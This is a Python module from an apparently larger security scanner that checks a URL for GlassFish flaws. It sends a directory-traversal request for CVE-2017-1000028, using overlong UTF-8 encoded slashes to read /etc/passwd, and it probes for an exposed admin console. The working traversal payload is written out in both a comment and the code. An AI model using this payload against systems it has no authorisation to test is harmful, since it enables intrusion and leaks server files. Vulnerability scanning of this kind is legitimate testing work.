import asyncio
from modules.core import console

# GlassFish Scanner (LFI/RCE)
# Focus: CVE-2017-1000028 (LFI via directory traversal) and Admin Console.

async def check_glassfish(session, url):
    # 1. Check for LFI (CVE-2017-1000028)
    # Payload: /theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
    # Note: %c0%af is a UTF-8 encoded slash (/) used to bypass filters.
    
    lfi_payload = "/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"  # classic linux
    # windows might need win.ini
    
    target_lfi = f"{url.rstrip('/')}{lfi_payload}"
    
    try:
        async with session.get(target_lfi, timeout=5, ssl=False) as resp:
            if resp.status == 200:
                text = await resp.text()
                if "root:x:" in text:
                     return {
                        "url": target_lfi,
                        "type": "GlassFish LFI (CVE-2017-1000028)",
                        "evidence": "/etc/passwd content leaked."
                    }
    except Exception:
        pass

    # 2. Check Admin Console
    # Usually port 4848, but valid on base URL if mapped /resource
    target_admin = f"{url.rstrip('/')}/resource/"
    try:
        async with session.get(target_admin, timeout=5, ssl=False) as resp:
             if resp.status == 200:
                 if "GlassFish" in await resp.text():
                      return {
                        "url": target_admin,
                        "type": "GlassFish Admin Console",
                        "evidence": "Admin console exposed."
                    }
    except Exception:
        pass
        
    return None

async def scan_glassfish(session, url):
    """
    Scan for GlassFish Vulnerabilities.
    """
    console.print(f"\n[bold cyan]--- GlassFish Scanner ---[/bold cyan]")
    
    results = []
    res = await check_glassfish(session, url)
    if res:
         console.print(f"  [bold red][!] GLASSFISH FOUND: {res['url']}[/bold red]")
         console.print(f"      Status: {res['type']}")
         results.append(res)
         
    if not results:
        console.print("[dim][-] No GlassFish vulnerabilities found.[/dim]")
        
    return results
